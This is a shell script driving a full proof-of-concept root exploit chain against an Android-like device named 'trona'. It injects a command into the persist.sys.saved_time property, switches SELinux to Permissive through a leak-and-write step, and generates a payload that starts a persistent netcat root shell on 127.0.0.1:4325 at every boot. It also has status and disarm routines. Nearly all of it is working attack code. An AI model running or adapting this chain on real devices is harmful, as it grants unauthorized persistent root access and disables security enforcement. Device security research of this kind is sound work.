#!/bin/sh
set -eu

# Full proof-of-concept driver for the trona root flow (root.md).
#
# Phases:
#   staging  (once) -> arm the time_update waiter via the boot's one-shot
#   reboot   -> fresh boot consumes the phase-2 chain
#   root     -> carrier leak/write (SELinux Permissive) + waiter fires payload
#               -> uid-0 listener on 127.0.0.1:4325
#   disarm   -> optional revert (reinstall numeric saved_time via staging)
#
# Usage:
#   scripts/root_poc.sh [payload]          auto-stage if needed, then root
#   scripts/root_poc.sh disarm             revert persistence (numeric restore)
#   scripts/root_poc.sh status             report current device state
#
# Requirements: adb stack under tools/xbps-root (see notes/uid1000-method.md),
# device authorized in `adb devices`.

repo_dir="$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
export PATH="$repo_dir/tools/xbps-root/usr/bin:$PATH"
export LD_LIBRARY_PATH="$repo_dir/tools/xbps-root/usr/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"

payload_default="$repo_dir/scripts/rootsvc_payload.sh"
waiter_trigger='x[$(sleep 30;/system/bin/sh /data/securedStorageLocation/w/b)]000'

generate_payload() {
  cat > "$payload_default" <<'PAYLOAD_EOF'
#!/system/bin/sh
echo "REROOT paydone uid=$(id -u) ctx=$(cat /proc/self/attr/current)"
log -t REROOT "paydone uid=$(id -u) ctx=$(cat /proc/self/attr/current)"
log -t ROOTSVC "start uid=$(id -u) ctx=$(cat /proc/self/attr/current)"
mkdir -p /data/local/tmp/rootsvc
chmod 0777 /data/local/tmp/rootsvc
toybox nc -s 127.0.0.1 -p 4325 -L /system/bin/sh -l 2>/dev/null &
svc_pid=$!
echo "$svc_pid" > /data/local/tmp/rootsvc/pid.txt
chmod 0644 /data/local/tmp/rootsvc/pid.txt
log -t ROOTSVC "listener pid=$svc_pid"
sleep 36000
PAYLOAD_EOF
  chmod 0755 "$payload_default"
}

adb() { timeout 30 "$repo_dir/tools/xbps-root/usr/bin/adb" "$@"; }
die() { echo "FATAL: $*" >&2; exit 1; }

check_device() {
  state="$(adb devices 2>&1 | awk '$2 == "device" {print $1}')"
  [ -n "$state" ] || die "no authorized device (adb devices <serial> device)"
  echo "device=$state"
  boot=""
  for i in $(seq 1 60); do
    boot="$(adb shell getprop sys.boot_completed 2>&1 | tr -d '\r')"
    [ "$boot" = 1 ] && break
    sleep 5
  done
  [ "$boot" = 1 ] || die "boot_completed never reached"
  echo "boot_completed=1"
}

armed_status() {
  saved_time="$(adb shell getprop persist.sys.saved_time 2>&1 | tr -d '\r')"
  if [ "$saved_time" = "$waiter_trigger" ]; then echo ARMED
  else echo "NUMERIC($saved_time)"; fi
}

phase_status() {
  echo "enforce=$(adb shell getenforce 2>&1 | tr -d '\r')"
  echo "state=$(armed_status)"
  echo "root_probe=$(printf 'id -u\nexit\n' | adb shell 'toybox nc -w 2 127.0.0.1 4325' 2>/dev/null | tr -d '\r')"
  echo "exemptions=$(adb shell 'settings get global hidden_api_blacklist_exemptions' 2>&1 | tr -d '\r')"
}

phase_disarm() {
  echo "disarm: restore numeric saved_time + remove waiter (consumes this boot's one-shot)"
  old="$(adb shell 'cat /data/local/tmp/__reroot_old_time' 2>&1 | tr -d '\r')"
  case "$old" in ''|*[!0-9]*) die "restore snapshot missing: $old";; esac
  cmd="rm -f /data/securedStorageLocation/w/b; setprop persist.sys.saved_time $old; printf '%s' disarmed=; getprop persist.sys.saved_time;"
  adb shell < "$repo_dir/scripts/zygote_payload_system_app.sh" >/dev/null
  sleep 3
  { printf '%s\nexit\n' "$cmd"; } | adb shell 'toybox nc -w 10 127.0.0.1 4321' >/dev/null
  sleep 2
  verify="$(adb shell getprop persist.sys.saved_time 2>&1 | tr -d '\r')"
  echo "saved_time_now=$verify"
  [ "$verify" = "$old" ] || { echo "disarm FAILED (still non-numeric); re-run from a clean boot"; exit 1; }
  echo "disarm OK; reboot to clear in-memory Permissive if desired"
}

wait_60s_for_waiter() {
  # Waiter fires ~30s into a boot; on a fresh boot we landed within that window
  # so this is only a sanity wait when device was rebooted by us.
  true
}

root_flow() {
  generate_payload
  payload="$([ "${1:-}" ] && echo "$1" || echo "$payload_default")"
  [ -f "$payload" ] || die "payload file not found: $payload"

  if [ "$(armed_status)" != ARMED ]; then
    echo "** PHASE A: staging waiter (consumes this boot's one-shot) **"
    "$repo_dir/scripts/stage_reroot_waiter.sh" "$payload" \
      || die "staging failed"
    echo "staging complete; rebooting to a fresh boot"
    adb reboot >/dev/null 2>&1 || true
    sleep 10
    adb wait-for-device || true
    check_device
  else
    echo "waiter already ARMED; skipping staging"
  fi

  echo "** PHASE B: root chain (carrier leak+write -> Permissive -> uid-0 waiter handoff) **"
  "$repo_dir/scripts/reroot_after_boot.sh" "$payload" \
    || die "phase B failed. If leak=0x40... (EALREADY): reboot and re-run."

  echo
  echo "persistence_state=$(armed_status)"
  case "$(armed_status)" in
    ARMED)
      echo "Persistent-root waiter stays armed; every fresh boot re-installs"
      echo "the uid-0 listener on 127.0.0.1:4325 within ~30s of boot."
      echo "Use: printf 'id\nexit\n' | adb shell 'toybox nc -w 3 127.0.0.1 4325'"
      ;;
    NUMERIC*)
      echo "time_update waiter is disarmed for the next boot; re-rooting"
      echo "requires re-staging the waiter and a reboot (root_poc.sh <payload>)."
      ;;
  esac
}

case "${1:-root}" in
  status)  phase_status ;;
  disarm)  check_device; phase_disarm ;;
  root)    check_device; root_flow "${2:-}" ;;
  *)       die "unknown subcommand: $1 (root|status|disarm)" ;;
esac
